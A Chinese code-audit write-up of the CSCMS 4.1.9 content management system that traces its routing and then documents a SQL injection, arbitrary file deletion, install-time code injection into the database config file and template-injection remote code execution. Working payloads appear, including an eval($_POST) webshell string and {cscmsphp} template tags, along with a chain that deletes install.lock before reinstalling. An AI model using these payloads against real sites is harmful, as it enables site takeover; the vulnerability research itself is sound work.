0x00 前言
=======

CSCMS是一款强大的多功能内容管理系统，采用php5+mysql进行开发，运用OOP（面向对象）方式进行框架搭建。CSCMS用CodeIgniter框架作为内核开发，基于MVC模式，使程序运行的速度和服务器得到很好的优化，使web平台拥有良好的兼容性和稳定性。

本文所用到的cscms版本是4.1.9， CI 框架版本为 3.1.3

0x01 全局分析
=========

安装就不说了，phpstudy 访问install.php 点点点就好了。

![image-20211227103411723.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-98160c304fd417403f6ee01fe04d85a6d7548214.png)

目录结构：

![image-20211227113335623.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-97a5cb2f31a985837627d9b99b2baa2e89288751.png)

配置文件在/upload/cscms/config目录下

![image-20211227113419553.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-581b1cd75f707530521d41bb4a44ef846cdf069f.png)

index.php
---------

为了弄清cscms的流程，来跟踪一下index.php的执行流程。

index.php是cscms的前台入口文件

```php
<?php
/**
 * @Cscms 4.x open source management system
 * @copyright 2008-2015 chshcms.com. All rights reserved.
 * @Author:Cheng Kai Jie
 * @Dtime:2017-03-10
 */
//默认时区
date_default_timezone_set("Asia/Shanghai");
//应用环境，TRUE 打开报错，FALSE关闭报错
define('ENVIRONMENT',false);
//路径分隔符
define('FGF', DIRECTORY_SEPARATOR);//DIRECTORY_SEPARATOR => / or \
//核心路径配置
$cs_folder = 'cscms/config';
//环境报错设置
if(ENVIRONMENT == TRUE){
    error_reporting(-1);
    ini_set('display_errors', 1);
}else{
    ini_set('display_errors', 0);
    if (version_compare(PHP_VERSION, '5.3', '>=')){
        error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
    }else{
        error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
    }
}
//路径常量设置
if(!defined('SELF')){
    define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));
}
if(!defined('FCPATH')){
    define('FCPATH', dirname(__FILE__).FGF);  //dirname(__FILE__)取得当前文件所在的绝对目录
}
//CSCMS路径检测
if(is_dir($cs_folder)){
    if (($_temp = realpath($cs_folder)) !== FALSE){
        $cs_folder = $_temp.FGF;
    }else{
        $cs_folder = strtr(rtrim($cs_folder, '/\\'),'/\\',FGF.FGF).FGF;
    }
}else{
    header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
    echo 'The kernel configuration directory is incorrect.';exit;
}
define('CSCMS', $cs_folder);
define('CSPATH', FCPATH.'cscms'.FGF);
define('CSCMSPATH', FCPATH.'packs'.FGF);
//当前运行URI
define('REQUEST_URI', str_replace(array(SELF,'//'),array('','/'),$_SERVER['REQUEST_URI']));
require_once CSCMS.'sys/Cs_Cscms.php';
```

定义了一些环境变量和路径常量，在一旁记录一下，方便之后查找：

```php
FCPATH : 当前文件所在的绝对路径，这里是 C:\Users\yokan\Desktop\cmcms\upload\index.php
CSCMS ：   cscms/config
CSPATH :   C:\Users\yokan\Desktop\cmcms\upload\cscms\
CSCMSPATH :    C:\Users\yokan\Desktop\cmcms\upload\packs\

#$cs_folder = 'cscms/config';
#define('CSCMS', $cs_folder);
#define('CSPATH', FCPATH.'cscms'.FGF);
#define('CSCMSPATH', FCPATH.'packs'.FGF);
```

最后引入了Cs\_Cscms.php文件，又定义了一些常量，以及访问主页的渲染：

```php
$sys_folder = 'cscms/system';
$app_folder = 'cscms/app';
$tpl_folder = 'tpl';

define('BASEPATH', $sys_folder);
define('SYSDIR', basename(BASEPATH));
define('APPPATH', $app_folder.FGF);
define('VIEWPATH', $tpl_folder.FGF);
```

```php
//获取当前目录路径参数
function cscms_cur_url() { 
    if(!empty($_SERVER["REQUEST_URI"])){ 
        $scrtName = $_SERVER["REQUEST_URI"]; 
        $nowurl = $scrtName; 
    } else { 
        $scrtName = $_SERVER["PHP_SELF"]; 
        if(empty($_SERVER["QUERY_STRING"])) { 
            $nowurl = $scrtName; 
        } else { 
            $nowurl = $scrtName."?".$_SERVER["QUERY_STRING"]; 
        } 
    } 
    $nowurl=str_replace("//", "/", $nowurl);
    return $nowurl; 
}
//获取当前URI参数
function cscms_uri($n=0){
    $REQUEST_URI = substr(REQUEST_URI,0,1)=='/' ? substr(REQUEST_URI,1) : REQUEST_URI;
    if(!empty($REQUEST_URI)){
        $arr = explode('/', $REQUEST_URI);
        if(Web_Path != '/'){
            unset($arr[0]);
            $arr = array_merge($arr);
        }
        if(!empty($arr[$n])){
            return str_replace("/", "", $arr[$n]);
        }
    }
    return '';
}
```

然后引入CI框架，载入框架的类、常量、函数、安全配置等：

```php
require_once BASEPATH.'core/CodeIgniter.php';
```

![image-20211227212347410.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8a24bb1ed303fed2f42b5cc490d89e5fa90f4d63.png)

接下来把重点关注在路由上，CodeIgniter.php引入了路由类，Router.php

![image-20211227215243138.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3adf26428c9ba7c79073cba08e8e382301aba2c4.png)

Router.php
----------

在全局分析的时候，一定要把路由搞清楚，不然后面很难将代码与功能点快速定位

代码很多，不用细看，搞懂它的路由规则就可以。

当然，CI官方文档也有现成的：[URI 路由 — CodeIgniter 3.1.5 中文手册|用户手册|用户指南|中文文档](https://codeigniter.org.cn/userguide3/general/routing.html)

> URL 中的每一段通常遵循下面的规则:
> 
> ```php
> example.com/class/function/id/
> ```
> 
> ![image-20211227224032016.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-810dc423d58e2e410a5cbe3bb08f32774d82c3d1.png)

例如这个url

```php
http://192.168.111.141/index.php/dance/playsong
```

我们很容易定位到dance类下的playsong方法：

![image-20211227222038902.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1ffc1afcb5f410e27a0104c0ce9d95c2c69f9503.png)

admin.php
---------

后台的跳转是通过设置标志位 “IS\_ADMIN=TRUE”来实现的：

admin.php:

```php
<?php
/**
 * @Cscms 4.x open source management system
 * @copyright 2008-2015 chshcms.com. All rights reserved.
 * @Author:Cheng Jie
 * @Dtime:2014-08-01
 */
define('IS_ADMIN', TRUE); // 后台标识
define('ADMINSELF', pathinfo(__FILE__, PATHINFO_BASENAME)); // 后台文件名
define('SELF', ADMINSELF);
define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR); // 网站根目录
require('index.php'); // 引入主文件
```

index.php:

```php
require_once CSCMS.'sys/Cs_Cscms.php';
```

Cs\_Cscms.php

![image-20211227222721012.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8318deec85c1b0b3a2cd28ea7bd4f43dd7db5542.png)

0x02 漏洞审计
=========

SQL注入
-----

upload/plugins/dance/playsong.php文件下的$zd变量，直接与sql语句拼接进行了查询操作

![image-20211228131812980.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-37a9897b80d6cc3483b2548f9d300f1a6ac9100d.png)

回溯一下它是怎么得到的：

找到get\_post函数定义的位置：

在phpstorm中，可以通过按两次shift键，进行搜索：

![image-20211228133151457.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9e9e6f031cafcf8579e1ed182e81dee715d23464.png)

进行CS\_input.php，来看一下get\_post函数：

执行流程 get\_post方法→get方法→fetch\_from\_array方法

![image-20211228133923658.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-471007d59ca39c1398e92268830a743f6b1fb8fa.png)

重点来了，下面是\_fetch\_from\_array方法的全部代码：

```php
    protected function _fetch_from_array(&$array, $index = NULL, $xss_clean = NULL, $sql_clean = FALSE)
    {
        is_bool($xss_clean) OR $xss_clean = $this->_enable_xss;

        // If $index is NULL, it means that the whole $array is requested
        isset($index) OR $index = array_keys($array);

        // allow fetching multiple keys at once
        if (is_array($index))
        {
            $output = array();
            foreach ($index as $key)
            {
                $output[$key] = $this->_fetch_from_array($array, $key, $xss_clean);
            }

            return $output;
        }

        if (isset($array[$index]))
        {
            $value = $array[$index];    //$_GET[zd]
        }
        elseif (($count = preg_match_all('/(?:^[^\[]+)|\[[^]]*\]/', $index, $matches)) > 1) // Does the index contain array notation
        {
            $value = $array;
            for ($i = 0; $i < $count; $i++)
            {
                $key = trim($matches[0][$i], '[]');
                if ($key === '') // Empty notation will return the value as array
                {
                    break;
                }

                if (isset($value[$key]))
                {
                    $value = $value[$key];
                }
                else
                {
                    return NULL;
                }
            }
        }
        else
        {
            return NULL;
        }
        if($xss_clean === TRUE){
            //CI自带过滤XSS
            $value = $this->security->xss_clean($value);
            if($sql_clean === TRUE){
                //过滤SQL语句
                $value = safe_replace($value);
            }else{
                //HTML代码转义
                $value = str_encode($value);
            }
        }
        return $value;
    }
} 
```

因为前面传入的参数为：

```php
$zd = $this->input->get_post('zd',TRUE,TRUE);
```

并且调用的是get方法，

所以：

```php
$value=$_GET['zd']   #$value的值即为zd参数通过get方法传入的内容
```

不过因为

```php
$sql_clean === TRUE
```

所以会调用safe\_replace函数进行过滤，我们看看过滤了些什么：

还是phpstorm按两次shift找到它的实现位置：

![image-20211228135159762.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-129f6eecc8120b764a8269ca05ae06607b4ccea1.png)

![image-20211228135223069.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0159841b5688f8fc0fb0fd9426defe7195e179fa.png)

可以看到，过滤和编码了一些特殊字符。

```php
$row=$this->db->query("select id,cid,singerid,name,tid,fid,purl,sc,lrc,dhits".$zd." from ".CS_SqlPrefix."dance where id=".$id."")->row();
```

但是我们不需要引号去闭合，仍然可以构造sql语句去执行：

![image-20211228141227707.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-26be2c6b66fc8c33c4a0b31915bf0099d312ae11.png)

![image-20211228141123761.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-aaebd9d13ed7e276079a5a060d2e180154641d9b.png)

任意文件删除
------

后台删除附件处没做任何判断和过滤：

![image-20211228150113381.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b690b13cb8007c91b739736f6563f884c2fcca0c.png)

![image-20211228150053413.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0183b6d8087d314519b4b04ec80589996481388b.png)

![image-20211228150058254.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-765ba6a9cdc3da87ecc2fa1523a20e14e45dc0f9.png)

安装RCE
-----

很多CMS都会存在这种漏洞，不过大多时候利用起来毕竟鸡肋，需要重新安装。

install.php

```php
<?php
/**
 * @Cscms 4.x open source management system
 * @copyright 2008-2018 chshcms.com. All rights reserved.
 * @Author:Cheng Kai Jie
 * @Dtime:2017-03-17
 */
define('IS_INSTALL', TRUE); // 安装标识
define('ADMINSELF', pathinfo(__FILE__, PATHINFO_BASENAME)); // 文件名
define('SELF', ADMINSELF);
define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR); // 网站根目录
$uri = parse_url('http://cscms'.$_SERVER['REQUEST_URI']);
$path = current(explode(SELF, $uri['path']));
define("install_path",$path);
define("install_url",install_path.'install.php/');
require('index.php'); // 引入主文件
```

→index.php→Cs\_Cscms.php

![image-20211228153918534.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9c67177de08ae36cc1daf154ad6763a3a606a619.png)

通过调试可以发现，后面的执行流程： install.php-&gt;common.php

![image-20211230205953702.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-567fe288ba533a632f637ceb45d6a21b320ad6ef.png)

![image-20211230210006380-16408692067801.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-49f9268a2ba2d978500b9e0f3a091027fc62b70f.png)

![image-20211230210019058.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-aecf3514ba66a1ecfb2b0bfbe9eaac1d490734ba.png)

一步步调试发现最后加载**/upload/plugins/sys/Install.php**

![image-20211230212431102.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-719c0dfb02efeaff9fd6db90d43eea7f3a168751.png)

```php
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Install extends Cscms_Controller {

    function __construct(){
            parent::__construct();
            $this->load->helper('url');
            $this->load->helper('file');
...........................................
............................................
.......................................
$this->load->helper('string');
$CS_Encryption_Key='cscms_'.random_string('alnum',10);
//修改数据库配置文件
$config=read_file(CSCMS.'sys'.FGF.'Cs_DB.php');
$config=preg_replace("/'CS_Sqlserver','(.*?)'/","'CS_Sqlserver','".$dbhost."'",$config);
$config=preg_replace("/'CS_Sqlname','(.*?)'/","'CS_Sqlname','".$dbname."'",$config);
$config=preg_replace("/'CS_Sqluid','(.*?)'/","'CS_Sqluid','".$dbuser."'",$config);
$config=preg_replace("/'CS_Sqlpwd','(.*?)'/","'CS_Sqlpwd','".$dbpwd."'",$config);
$config=preg_replace("/'CS_Dbdriver','(.*?)'/","'CS_Dbdriver','".$dbdriver."'",$config);
$config=preg_replace("/'CS_SqlPrefix','(.*?)'/","'CS_SqlPrefix','".$dbprefix."'",$config);
$config=preg_replace("/'CS_Encryption_Key','(.*?)'/","'CS_Encryption_Key','".$CS_Encryption_Key."'",$config);
if(!write_file(CSCMS.'sys'.FGF.'Cs_DB.php', $config)) exit('5');
.............................................
............................................
.........................................
```

匹配我们输入的一些数据库常量的值，没有过滤，然后写入Cs\_DB.php文件：

![image-20211228154900156.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-be32428ef00f67ed00d344c68cdc459b0ca04ce1.png)

比如数据库名称，我们可以直接通过拼接插马：

```php
cscms');phpinfo();// 
cscms');eval($_POST[‘cmd’]); //
```

![image-20211228154955439.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5180c921077e15443b4d80abd6d166d51d492490.png)

![image-20211228155011914.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f29bba4f0508592e9450e8c43865b54d51a9f787.png)

查看效果：

因为cs\_cscms.php中包含了cs\_db.php，

index.php又包含了Cs\_Cscms.php

所以我们在首页即可触发：

![image-20211228155151518.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ddd7d82a4d5209f5ef24abe6217c8bcab5b356d6.png)

配合上面的任意文件删除漏洞，删除掉install.lock文件，然后重新安装，即可完成RCE

前台RCE
-----

通过seay的自动审计，定位到Csskins.php的eval函数：

![image-20211228174923278.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7722ca6da8e372a81ce782fde3aa0a69fa6a56c2.png)

```php
    // php标签处理
    public function cscms_php($php,$content,$str) {
        $evalstr=" return $content";
        $newsphp=eval($evalstr);
        $str=str_replace($php,$newsphp,$str);
        return $str;
    }
```

看一下$content参数是否可以控制。

首先看谁调用了这个方法：

![image-20211228180051697.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d30c4137e7642b8d72310d13fa8007839be80a7b.png)

![image-20211228180327645.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-42bbb2abe301273f87d1f7025401e31eb206f93a.png)

定位到template\_parse方法：

```php
//解析模板
public function template_parse($str,$ts=TRUE,$if=true,$row=array()) {
    if(empty($str)) msg_txt(L('skins_null'));
    //解析头部、底部、左右分栏
    $str = $this->topandend($str);
    //会员登录框
    $str=str_replace('{cscms:logkuang}',$this->logkuang(),$str);
    //自定义标签
    $str=$this->cscmsopt($str);
    //解析全局标签
    $str=$this->cscms_common($str);
    //数据循环
    $str=$this->csskins($str);
    //数据统计标签
    $str=$this->cscount($str);
    //自定义字段
    $field = isset($row['cscms_field']) ? $row['cscms_field'] : $row;
    $str=$this->field($str,$field);

    //PHP代码解析
    preg_match_all('/{cscmsphp}([\s\S]+?){\/cscmsphp}/',$str,$php_arr);
    if(!empty($php_arr[0])){
        for($i=0;$i<count($php_arr[0]);$i++){
            $str=$this->cscms_php($php_arr[0][$i],$php_arr[1][$i],$str);
        }
    }
    unset($php_arr);
    ............................................
    ............................................
    .............................................
```

关注PHP代码解析这块，通过preg\_match\_all函数匹配template\_parse第一个参数$str的内容，然后调用cscmsphp，用eval进行执行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3840f66deb878cd04c9934f8ec0d61c3701f2d38.png)  
也就是说“程序会将 **{cscmsphp}** 标签中包裹的代码当做 **PHP** 代码来执行”

因此，接下来就是全局搜索 调用**template\_parse**方法的地方，有没有可以控制的点了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6537672b8dc47dfdaf322cd3e92c3fd3add811af.png)  
全局搜索之后，发现调用这个函数的地方有很多，但是我们要做的就是筛选出有漏洞的地方，但是什么是有漏洞的地方呢，一切输入都是有害的，所以，最好是能找到与数据库操作有关的内容，这些应该是我们要找的重点。

```php
$Mark_Text=$this->Csskins->template_parse($Mark_Text,true);
```

搜索之后会发现，所有的模板大概都是这样加载的，于是我们就把重点放在了变量Mark\_Text上面

挨个去看

这里找到Cstpl.php文件的plub\_show方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6c20a36696c6ef8e37b164747c9b4c276b341faf.png)

对视频内容的各种标签进行了解析，然后无过滤的传入了template\_parse函数去执行

然后找到就去寻找谁调用了plub\_show方法：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-89eb6332ba24aaf81ff27ab0fbb51c51af78d78d.png)

好多都可以控制输入，但是有的经过分析发现进行了过滤。

这里找到show.php文件：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c48b17f765092b789a19d09b6fbffa0e3ce50d48.png)

这个 文件页面是用来播放视频的。

所以上传视频：

（先到后台，给权限）

对应的是plugins/vod/user/vod.php文件: save函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5ca13af3436a1d7eebeca41785d0d9db484ebda8.png)

选填字段，用的remove\_xss进行过滤，但是该函数没有过滤掉 cscmsphp 模板注入

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d000a46085cad37620fbcab587f2a4098a0ed5f1.png)

因此，在上传视频的选填字段，剧情简介处插入SSTI

```php
{cscmsphp}phpinfo();{/cscmsphp}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-91320ee426c1f7688a3a4de3a63a756b2e861045.png)

然后访问即可触发：

![image-20211228225622524.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6ee8f03c4184578eb8911e24014280055652c084.png)

类似的点还有几个，感兴趣的可以去找找。

后台RCE1
------

也是SSTI模板注入，只不过触发点不同，具体调用过程就不分析了，类似的点肯定还有很多。

创建个用户，设置个人签名 {cscmsphp}phpinfo(){/cscmsphp}

发现‘cscmsphp’已经被过滤掉了。

![image-20211228230041797.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d44d119050f25a753e84b4ae008755de1858222e.png)

登录管理员后台，会员列表页面，可以修改会员信息

<http://127.0.0.1/upload/admin.php/user/edit?id=1>

![image-20211228230103726.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-84a944a7fa6bb2da3a54b866082c38bcc1692692.png)

写入payload如上

然后访问如下url，即可触发

<http://127.0.0.1/upload/index.php/justtest/home/info>

![image-20211228230118401.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-abb440d28ac5fcfa17d171f99cfb29f04debd8fc.png)

![image-20211228230123128.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8cd22d3a5f2da2dea23f165ab07402eaf32d050c.png)

后台RCE2
------

修改模板 插马

html会以php解析

这里其实是黑盒测到的：管理员后台可以修改会员主页模板：

![image-20211228234435524.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6e571fbab8bb711f14b5fbd2a6c847bc081749a0.png)

而一些php文件里直接不加过滤的引用了这些html文件，造成解析

![image-20211228234625659.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-88f11dffdceb6598ce5208a35563286774c8ae12.png)

![image-20211228234603188.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a974113012e47ba579451a58c804e04a08022c71.png)